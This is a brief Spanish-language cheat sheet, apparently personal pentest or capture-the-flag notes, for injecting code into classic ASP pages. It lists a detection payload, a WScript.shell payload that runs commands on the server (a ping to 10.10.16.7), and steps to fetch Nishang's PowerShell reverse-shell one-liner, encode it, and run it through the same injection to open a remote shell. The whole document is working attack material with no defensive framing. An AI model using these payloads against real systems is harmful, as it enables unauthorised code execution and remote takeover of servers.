### VER SI ES VULNERABLE
```shell
<%response.write(7*7)%>
```

### EJECUTAR UN PING
```shell
<%response.write CreateObject("WScript.shell").Exec("cmd /c ping -n 1 10.10.16.7").StdOut.Readall()%>
```


### REVERSE SHELL
```shell
wget https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/Shells/Invoke-PowerShellTcpOneLine.ps1
mv Invoke-PowerShellTcpOneLine.ps1 reverse.ps1
#EDITARLO Y QUEDARSE SOLO CON LA LINEA DE CLIENT
cat reverse.ps1 | iconv -t utf-16le | base64 -w 0; echo

<%response.write CreateObject("WScript.shell").Exec("cmd /c powershell -enc ...").StdOut.Readall()%>
```
